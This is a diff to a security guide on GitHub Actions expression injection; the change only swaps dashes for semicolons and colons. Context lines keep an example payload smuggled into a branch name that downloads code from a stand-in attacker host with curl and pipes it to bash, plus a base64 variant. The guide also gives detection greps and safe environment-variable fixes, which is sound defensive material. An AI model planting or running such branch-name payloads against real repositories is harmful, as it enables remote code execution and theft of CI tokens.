@@ -46,8 +46,8 @@ dev$(UNTRUSTED_REMOTE_EXECUTION)
 ```
 
 Breakdown:
-- `${IFS}` — Internal Field Separator, becomes a space
-- `$({curl,-sSfL,attacker.com/steal})` — brace expansion + command substitution
+- `${IFS}`; Internal Field Separator, becomes a space
+- `$({curl,-sSfL,attacker.com/steal})`; brace expansion + command substitution
 - The `|${IFS}bash` pipes the download to bash
 
 **Real-world:** Used against microsoft/ai-discovery-agent. The payload was embedded in the branch name, and the 2m38s execution gap in the "Save format request data" step confirmed code execution.
@@ -75,7 +75,7 @@ The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command subs
 
 ### PR Title / Body Injection
 
-The most straightforward vector — attacker fully controls PR title and body:
+The most straightforward vector; attacker fully controls PR title and body:
 
 ```yaml
 # VULNERABLE
@@ -103,7 +103,7 @@ jobs:
 
 ### Commit Message Injection
 
-On `push` triggers, commit messages are technically injectable — but **only if the push trigger accepts pushes from untrusted sources** (e.g., unprotected branches that anyone can push to). On protected branches (e.g., `main`, `master`), pushing requires write access, so the attacker already has full repo access and this is **not a meaningful finding**.
+On `push` triggers, commit messages are technically injectable; but **only if the push trigger accepts pushes from untrusted sources** (e.g., unprotected branches that anyone can push to). On protected branches (e.g., `main`, `master`), pushing requires write access, so the attacker already has full repo access and this is **not a meaningful finding**.
 
 ```yaml
 # NOT TYPICALLY VULNERABLE: push to protected branch requires write access
@@ -114,7 +114,7 @@ steps:
   - run: echo "Commit: ${{ github.event.commits[0].message }}"
 ```
 
-### workflow_dispatch Input Injection — NOT A FINDING
+### workflow_dispatch Input Injection: NOT A FINDING
 
 `workflow_dispatch` requires **write access** to the repository to trigger. Someone with write access can already push arbitrary code directly, so injection via dispatch inputs adds no additional risk. **Do not report this pattern.**
 
@@ -150,7 +150,7 @@ grep -B5 -A5 '\${{.*github\.event\.' .github/workflows/*.yml | grep -B5 'run:'
 # Find head_ref usage (dangerous in PR-triggered workflows)
 grep -rn 'github\.head_ref\|pull_request\.head\.ref\|pull_request\.head\.label' .github/workflows/
 
-# NOTE: Do NOT flag workflow_dispatch inputs — requires write access, not an external threat
+# NOTE: Do NOT flag workflow_dispatch inputs: requires write access, not an external threat
 ```
 
 ---
@@ -171,7 +171,7 @@ For direct shell interpolation, pass expressions through environment variables a
 
 Why this works:
 1. `${{ }}` substitution happens first, setting the env var value
-2. The shell sees `$PR_TITLE` — a variable reference, not raw content
+2. The shell sees `$PR_TITLE`; a variable reference, not raw content
 3. Shell variable expansion with quotes prevents injection
 
 **Important:** The shell variable MUST be quoted (`"$PR_TITLE"`, not `$PR_TITLE`) to prevent word splitting.
@@ -179,19 +179,19 @@ Why this works:
 ### Fix Examples
 
 ```yaml
-# Branch name — SAFE
+# Branch name: SAFE
 - env:
     BRANCH: ${{ github.head_ref }}
   run: echo "$BRANCH" > branch_name.txt
 
-# PR title — SAFE
+# PR title: SAFE
 - env:
     TITLE: ${{ github.event.pull_request.title }}
   run: |
     echo "## PR Summary" >> $GITHUB_STEP_SUMMARY
     echo "$TITLE" >> $GITHUB_STEP_SUMMARY
 
-# Multiple expressions — SAFE
+# Multiple expressions: SAFE
 - env:
     PR_TITLE: ${{ github.event.pull_request.title }}
     PR_BODY: ${{ github.event.pull_request.body }}
@@ -200,7 +200,7 @@ Why this works:
     echo "Title: $PR_TITLE"
     echo "Branch: $HEAD_REF"
 
-# workflow_dispatch input — SAFE
+# workflow_dispatch input: SAFE
 - env:
     VERSION: ${{ github.event.inputs.version }}
   run: echo "Releasing $VERSION"
@@ -261,7 +261,7 @@ These expressions are **dangerous when used in `run:` blocks** because an attack
 | `github.ref_name` (on `push` to protected branch) | Protected branch rules apply |
 | `secrets.*` | Secrets interpolated into `run:` are literal script text too; use quoted environment variables instead |
 | `github.run_id` / `github.run_number` | Numeric |
-| `github.event.inputs.*` (workflow_dispatch) | Requires write access — not an external threat |
+| `github.event.inputs.*` (workflow_dispatch) | Requires write access; not an external threat |
 | `github.event.commits[*].message` (push to protected) | Requires write access |
 
 ---
@@ -276,12 +276,12 @@ TRIGGER: Workflow [file:line] runs on [event], expression at line [N]
   expands to shell code
 EXECUTION: Shell interprets ${{ }} output as:
   [show the expanded shell command]
-IMPACT: [RCE, token theft, etc.] — token permissions: [list]
+IMPACT: [RCE, token theft, etc.]; token permissions: [list]
 ```
 
 ---
 
 ## References
 
-- [GitHub Docs: Security hardening — Expression injection](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
-- [HackerBot Claw — branch name and filename injection attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
+- [GitHub Docs: Security hardening; Expression injection](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
+- [HackerBot Claw; branch name and filename injection attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
